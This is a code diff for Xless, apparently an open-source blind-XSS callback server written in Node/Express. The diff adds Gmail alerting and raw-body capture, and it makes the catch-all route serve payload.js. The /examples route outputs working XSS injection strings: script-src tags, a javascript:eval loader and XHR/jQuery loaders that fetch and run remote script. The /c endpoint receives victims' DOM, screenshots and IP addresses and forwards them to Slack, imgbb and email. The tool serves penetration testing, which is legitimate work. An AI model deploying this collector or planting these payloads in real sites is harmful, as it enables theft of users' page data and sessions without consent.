@@ -1,28 +1,55 @@
 // Xless: The Serverlesss Blind XSS App.
 // Version: v1.2
 // Author: Mazin Ahmed <mazin@mazinahmed.net>
+
 const express = require("express");
+const nodemailer = require("nodemailer");
 var bodyParser = require("body-parser");
 var cors = require("cors");
 const process = require("process");
 var request = require("request");
+const path = require("path");
+const htmlentite = require('he')
+//var noBots = require('express-nobots');
+
+
 // Support local development with .env
-require('dotenv').config()
+require('dotenv').config();
+
 const port = process.env.PORT || 3000;
 const imgbb_api_key = process.env.IMGBB_API_KEY
 const slack_incoming_webhook = process.env.SLACK_INCOMING_WEBHOOK
+const gmail_username = process.env.GMAIL_USERNAME
+const gmail_password = process.env.GMAIL_PASSWORD
+const email_receiver = process.env.EMAIL_ALERT
+
 const app = express();
 app.use(cors());
+
+//app.use(noBots({block:true}));
+
+function rawBodySaver (req, res, buf, encoding) {
+  if (buf && buf.length) {
+    req.rawBody = buf.toString(encoding || 'utf8')
+  }
+}
+
 app.use(bodyParser.json({limit: '15mb'}));
-app.use(bodyParser.urlencoded({limit: '15mb', extended: true}));
+app.use(bodyParser.urlencoded({limit: '15mb', extended: true, verify: rawBodySaver}));
+app.use(bodyParser.raw({type: () => true}));
+
 app.use(function (req, res, next) {
   // Headers
   res.header("Powered-By", "XLESS");
   res.header("Access-Control-Allow-Origin", "*");
-  res.header("Access-Control-Allow-Methods", "GET,POST");
-  res.header("Access-Control-Allow-Headers", "Content-Type");
+  res.header("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
+  res.header("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
+  res.header("Access-Control-Max-Age", "86400");
+
   next();
 });
+
+
 function generate_blind_xss_alert(body) {
   var alert = "*XSSless: Blind XSS Alert*\n";
   for( let k of Object.keys(body)) {
@@ -39,60 +66,81 @@ function generate_blind_xss_alert(body) {
   }
   return(alert)
 }
-function ip_trace(ip){
-	return new Promise(function(resolve, reject){
-		const trace = {
-			method: "GET",
-			url: "https://0xspa.de/api.php?ip="+ip,
-			port: 443
-		}
-		request(trace, function(err, traceIP){
-			if (err) {
-				reject(err)
-			}else {
-				resolve(traceIP)
-			}
-		})
-	})
+
+function generate_blind_xss_html(body){
+  var content = "<html><head><title>XSSless: Blind XSS Alert</title></head><body><h1>XSSless: Blind XSS Alert</h1><table style=\"border: none;\">";
+  for( let k of Object.keys(body)){
+    if(k === "Screenshot" || k === "DOM") {
+      continue
+    }
+    content += "<tr>"
+    if(body[k] === ""){
+      content += "<td><strong>"+k+": </strong></td><td><code>None</code></td>"
+    }else{
+      content += "<td><strong>"+k+": </strong></td><td><code>"+htmlentite.encode(body[k])+"</code></td>"
+    }
+    content += "</tr>"
+  }
+  content += "</table></body></html>";
+  return(content)
 }
-function generate_callback_alert(request, headers, data, url) {
+
+function generate_callback_alert(request, headers, data, raw, url) {
   var alert = "*XSSless: Out-of-Band Callback Alert*\n";
-  alert += "The request was received from IP address `"+data["Remote IP"]+"` at `"+new Date()+"`.\n _More info <https://0xspa.de/api.php?ip="+data["Remote IP"]+"|here> _\n"
+  alert += "The request was received from IP address `"+data["Remote IP"]+"`. More info: `http://www.ip-tracker.org/locator/ip-lookup.php?ip="+data["Remote IP"]+"`\n"
   const headers_str = JSON.stringify(headers)
   const heads = JSON.parse(headers_str)
   alert += "```"+ request.method +" "+ url +" HTTP/"+request.httpVersion+"\n"
   for(var keys in heads){
-	if(heads.hasOwnProperty(keys)){
-		switch(keys){
-			case("x-vercel-deployment-url"):
-			case("x-vercel-forwarded-for"):
-			case("x-vercel-id"):
-				continue
-		}
-		alert += keys+": "+heads[keys]+"\n"
+	switch(keys){
+		case("x-vercel-deployment-url"):
+		case("x-vercel-forwarded-for"):
+		case("x-vercel-id"):
+    case("x-vercel-proxy-signature-ts"):
+    case("x-vercel-ip-latitude"):
+    case("x-vercel-ip-longitude"):
+    case("x-vercel-proxied-for"):
+    case("x-vercel-ip-country"):
+    case("x-vercel-ip-timezone"):
+    case("x-vercel-ip-city"):
+    case("x-vercel-ip-country-region"):
+    case("x-vercel-proxy-signature"):
+    case("forwarded"):
+			continue
 	}
+	alert += keys+": "+heads[keys]+"\n"
   }
   if (headers["Referer"] !== undefined) {
     alert += "referer: "+ headers["referer"] +"\n"
   }
   if (request.body !== undefined) {
      if(request.method != 'GET' && request.method != 'HEAD'){
-	delete request.body["Remote IP"]
-    	const datas = JSON.stringify(request.body)
-    	alert += "\n"
-    	alert += datas
-    	alert += "\n"
+	    delete request.body["Remote IP"]
+      if(headers['content-type'] === "application/json"){
+        const d = JSON.stringify(request.body)
+        alert += "\n"
+    	  alert += d
+        alert += "\n"
+      }else{
+        alert += "\n"
+    	  alert += raw
+        alert += "\n"
+      }     
+    	
      }
   }
   alert += "```"
   return(alert)
 }
+
 function generate_message_alert(body) {
   var alert = "*XSSless: Message Alert*\n"
   alert += "```\n" + body + "```\n";
   return alert
 }
+
 async function uploadImage(image) {
+
   // Return new promise
   return new Promise(function(resolve, reject) {
     const options = {
@@ -106,6 +154,7 @@ async function uploadImage(image) {
             "image" : image
         }
     }
+
     // Do async request
     request(options, function(err, imgRes, imgBody) {
       if (err) {
@@ -116,6 +165,7 @@ async function uploadImage(image) {
     })
   })
 }
+
 app.get("/examples", (req, res) => {
   res.header("Content-Type", "text/plain")
   //var url = req.protocol + '://' + req.headers['host']
@@ -123,20 +173,25 @@ app.get("/examples", (req, res) => {
   var page = ""
   page += `\'"><script src="${url}"></script>\n\n`
   page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`
+
   page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`
+
   page += `<script>$.getScript("${url}")</script>`
   res.send(page)
   res.end()
 })
+
 app.all("/message", (req, res) => {
   var message = req.query.text || req.body.text
   const alert = generate_message_alert(message)
   data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}
+
   request.post(process.env.SLACK_INCOMING_WEBHOOK, data, (out)  => {
     res.send("ok\n")
     res.end()
   });
 })
+
 async function htmlUpload(html){
 	return new Promise(function(resolve, reject){
 		const rekwest = {
@@ -150,6 +205,7 @@ async function htmlUpload(html){
 				"text": html
 			}
 		}
+
 		request(rekwest, function(err, success){
 			if(err){
 				reject(err)
@@ -159,64 +215,119 @@ async function htmlUpload(html){
 		})
 	})
 }
-app.post("/c", async (req, res) => {
-    let data = req.body
-    // Upload our screenshot and only then send the Slack alert
-    data["Screenshot URL"] = ""
-    if (imgbb_api_key && data["Screenshot"]) {
-      const encoded_screenshot = data["Screenshot"].replace("data:image/png;base64,","")
-      try {
-        const imgRes = await uploadImage(encoded_screenshot)
-        const imgOut = JSON.parse(imgRes)
-        if (imgOut.error) {
-          data["Screenshot URL"] = "NA"
-        }
-        else if(imgOut.data && imgOut.data.url_viewer) {
-          // Add the URL to our data array so it will be included on our Slack message
-          data["Screenshot URL"] = imgOut.data.url_viewer
-        }
-      }catch (e) {
-        data["Screenshot URL"] = e.message
+
+async function emailsend(username, password, receiver, content){
+  return new Promise(function(resolve, reject){
+    var compose = nodemailer.createTransport({
+      host: "smtp.gmail.com",
+      port: 587,
+      secure: false,
+      auth: {
+        user: username,
+        pass: password
       }
-    }
-   data["HTML Data"] = ""
-   if(data["DOM"].length >= 2500){
-	try {
-		const success = await htmlUpload(data["DOM"].replace(/\n/g,''))
-		const htmlFinal = JSON.parse(success.body)
-		if(htmlFinal.message == "Not Found"){
-			data["HTML Data"] = "Not Found"
-		}else if(htmlFinal.link){
-			data["HTML Data"] = `${htmlFinal.link}`
-		}
-	}catch(e) {
-		data["HTML Data"] = e.message
-	}
-   }else{
-	data["HTML Data"] = data["DOM"]
-   }
-    // Now handle the regular Slack alert
-    data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress
-    const alert = generate_blind_xss_alert(data)
-    data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}
-    request.post(slack_incoming_webhook, data, (out)  => {
-      res.send("ok\n")
-      res.end()
     });
+  
+    var options = {
+      from: username,
+      to: receiver,
+      subject: "XSSless: Blind XSS Alert",
+      html: content
+    }
+  
+    compose.sendMail(options, function (error, response) {
+      if (error) {
+        reject(error);
+      } else {
+        resolve("Message sent: " + response.messageId);
+      }
+    });
+  })
+}
+
+app.post("/c", async (req, res) => {
+  let data = req.body
+  // Upload our screenshot and only then send the Slack alert
+  data["Screenshot URL"] = ""
+  if (imgbb_api_key && data["Screenshot"]) {
+    const encoded_screenshot = data["Screenshot"].replace("data:image/png;base64,","")
+    try {
+      const imgRes = await uploadImage(encoded_screenshot)
+      const imgOut = JSON.parse(imgRes)
+      if (imgOut.error) {
+        data["Screenshot URL"] = "NA"
+      }
+      else if(imgOut.data && imgOut.data.url_viewer) {
+        // Add the URL to our data array so it will be included on our Slack message
+        data["Screenshot URL"] = imgOut.data.url_viewer
+      }
+    }catch (e) {
+      data["Screenshot URL"] = e.message
+    }
+  }
+
+
+ data["HTML Data"] = ""
+ if(data["DOM"].length >= 2500){
+try {
+  const success = await htmlUpload(data["DOM"].replace(/\n/g,''))
+  const htmlFinal = JSON.parse(success.body)
+  if(htmlFinal.message == "Not Found"){
+    data["HTML Data"] = "Not Found"
+  }else if(htmlFinal.link){
+    data["HTML Data"] = `${htmlFinal.link}`
+  }
+}catch(e) {
+  data["HTML Data"] = e.message
+}
+ }else{
+data["HTML Data"] = data["DOM"]
+ }
+  // Now handle the regular Slack alert
+  data["Remote IP"] = req.headers["x-forwarded-for"] || req.socket.remoteAddress
+  
+  data["Email Status"] = "";
+  
+  const htmlcontent = generate_blind_xss_html(data)
+  try{
+    const emailsent = await emailsend(gmail_username, gmail_password, email_receiver, htmlcontent)
+    if(emailsent){
+      data["Email Status"] = emailsent
+    }else{
+      data["Email Status"] = emailsent
+    }
+  }catch(e){
+    data["Email Status"] = e.message
+  }
+
+  const alert = generate_blind_xss_alert(data)
+  data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}
+  request.post(slack_incoming_webhook, data, (out)  => {
+    res.send("ok\n")
+    res.end()
+  });
 })
+
 /**
  * Route to check the health of our xless listener
  */
 app.get("/health", async (req, res) => {
     let health_data = {}
+
     // Check if the environemtn variables are set
     health_data.IMGBB_API_KEY = (imgbb_api_key !== undefined)
     health_data.SLACK_INCOMING_WEBHOOK = (slack_incoming_webhook !== undefined)
-    if (!health_data.IMGBB_API_KEY || !health_data.SLACK_INCOMING_WEBHOOK) {
+    health_data.GMAIL_USERNAME = (gmail_username !== undefined)
+    health_data.GMAIL_PASSWORD = (gmail_password !== undefined)
+    health_data.EMAIL_ALERT = (email_receiver !== undefined)
+
+    if (!health_data.IMGBB_API_KEY || !health_data.SLACK_INCOMING_WEBHOOK || !health_data.GMAIL_USERNAME || !health_data.GMAIL_PASSWORD || !health_data.EMAIL_ALERT) {
       res.json(health_data)
       res.end()
     }
+
     const xless_logo = "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"
+
     try {
       const imgRes = await uploadImage(xless_logo)
       const imgOut = JSON.parse(imgRes)
@@ -231,20 +342,25 @@ app.get("/health", async (req, res) => {
     catch (e) {
       health_data.imgbb_response = e.message
     }
+
     res.json(health_data)
     res.end()
 })
+
 app.all("/*", (req, res) => {
   var headers = req.headers
   var data = req.body
-  data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress
-  const alert = generate_callback_alert(req, headers, data, req.url)
+  var raw = req.rawBody
+  data["Remote IP"] = req.headers["x-forwarded-for"] || req.socket.remoteAddress
+  const alert = generate_callback_alert(req, headers, data, raw, req.url)
   data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}
+
   request.post(slack_incoming_webhook, data, (out)  => {
-    res.send("ok\n")
-    res.end()
+    res.sendFile(path.join(__dirname + '/payload.js'))
   });
 })
+
+
 app.listen(port, err => {
     if (err) throw err
     console.log(`> Ready On Server http://localhost:${port}`)
